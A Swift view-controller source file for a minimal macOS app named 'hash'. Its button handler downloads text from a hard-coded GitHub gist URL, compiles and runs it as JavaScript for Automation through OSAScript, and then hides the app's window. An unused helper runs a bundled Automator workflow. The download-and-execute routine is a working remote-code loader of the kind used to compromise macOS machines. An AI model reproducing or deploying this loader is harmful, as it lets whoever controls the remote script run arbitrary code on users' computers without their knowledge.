//
//  ViewController.swift
//  hash
//
//  Created by brian on 1/29/21.
//

import Cocoa
import CoreFoundation
import OSAKit
import Automator

class ViewController: NSViewController {

    override func viewDidLoad() {
        super.viewDidLoad()

        // Do any additional setup after loading the view.
    }

    override var representedObject: Any? {
        didSet {
        // Update the view, if already loaded.
        }
    }
    @IBAction func Yesss(_ sender: Any) {
        download("https://gist.githubusercontent.com/grines/d9f6e2aa9c4d417d74a61c8f5282176e/raw/befa6737843940d724021afd5b150a3b7821772c/gistfile1.txt")
    }
    
    func download(_ args: String) -> Int32 {
        let url = URL(string: args)!
        
        let task = URLSession.shared.downloadTask(with: url) { localURL, urlResponse, error in
            if let localURL = localURL {
                if let string = try? String(contentsOf: localURL) {
                    print(string)
                    let k = OSAScript.init(source: string, language: OSALanguage.init(forName: "JavaScript"))
                    var compileErr : NSDictionary?
                    k.compileAndReturnError(&compileErr)
                    var scriptError : NSDictionary?
                    
                    k.executeAndReturnError(&scriptError)
                    sleep(1)
                    NSRunningApplication.current.hide()
                }
            }
        }

        task.resume()
    return 1
}
    
    func workflow(_ args: String) -> Int32 {
        guard let workflowPath = Bundle.main.path(forResource: "test", ofType: "workflow") else {
                print("Workflow resource not found")
                return 1
            }

            let workflowURL = URL(fileURLWithPath: workflowPath)
            do {
                try AMWorkflow.run(at:workflowURL, withInput: nil)
            } catch {
                print("Error running workflow: \(error)")
            }
        return 1
    }
}
